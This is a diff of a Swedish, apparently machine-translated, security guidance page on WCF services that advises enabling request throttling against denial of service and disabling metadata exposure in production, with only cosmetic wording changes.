 ## <a id="throttling"></a>Aktivera begränsning funktionens WCF-tjänsten
 
-| Titel                   | Information      |
+| Rubrik                   | Information      |
 | ----------------------- | ------------ |
 | **Komponent**               | WCF | 
 | **SDL fas**               | Utveckla |  
-| **Tillämpliga tekniker** | .NET framework 3 |
+| **Tillämpliga tekniker** | .NET Framework 3 |
 | **Attribut**              | Gäller inte  |
 | **Referenser**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [spikning Nordirland](https://vulncat.fortify.com) |
-| **Steg** | <p>Placera inte en gräns på användningen av systemresurser kan resultera i resursuttömning och i slutänden DOS-attacker.</p><ul><li>**Förklaring:** Windows Communication Foundation (WCF) ger dig möjlighet att begränsa tjänstbegäranden. För många klientbegäranden kan översvämma ett system och använt dess resurser. Å andra sidan, så att endast ett litet antal begäranden till en tjänst kan förhindra att behöriga användare att använda tjänsten. Varje tjänst ska ställas in och konfigurerad för att tillåta lämplig mängd resurser individuellt.</li><li>**REKOMMENDATIONER** aktivera WCF service begränsning funktionen och ange gränser som är lämpliga för ditt program.</li></ul>|
+| **Steg** | <p>Placera inte en gräns på användningen av systemresurser kan resultera i resursuttömning och i slutänden DOS-attacker.</p><ul><li>**FÖRKLARING:** Windows Communication Foundation (WCF) ger dig möjlighet att begränsa tjänstbegäranden. För många klientbegäranden kan översvämma ett system och använt dess resurser. Å andra sidan, så att endast ett litet antal begäranden till en tjänst kan förhindra att behöriga användare att använda tjänsten. Varje tjänst ska ställas in och konfigurerad för att tillåta lämplig mängd resurser individuellt.</li><li>**REKOMMENDATIONER** aktivera WCF service begränsning funktionen och ange gränser som är lämpliga för ditt program.</li></ul>|
 
 ### <a name="example"></a>Exempel
 Följande är ett exempel på en konfiguration med begränsning aktiverat:
@@ -623,11 +623,11 @@ Följande är ett exempel på en konfiguration med begränsning aktiverat:
 
 ## <a id="info-metadata"></a>WCF-utlämnande via metadata
 
-| Titel                   | Information      |
+| Rubrik                   | Information      |
 | ----------------------- | ------------ |
 | **Komponent**               | WCF | 
 | **SDL fas**               | Utveckla |  
-| **Tillämpliga tekniker** | .NET framework 3 |
+| **Tillämpliga tekniker** | .NET Framework 3 |
 | **Attribut**              | Gäller inte  |
 | **Referenser**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [spikning Nordirland](https://vulncat.fortify.com) |
 | **Steg** | Metadata kan angripare Lär dig mer om systemet och planera en typ av angrepp. WCF-tjänster kan konfigureras för att visa metadata. Metadata ger information om detaljerade tjänstens beskrivning och inte skickas ut i produktionsmiljöer. Den `HttpGetEnabled`  /  `HttpsGetEnabled` egenskaper i klassen ServiceMetaData definierar om en tjänst ska exponera metadata | 
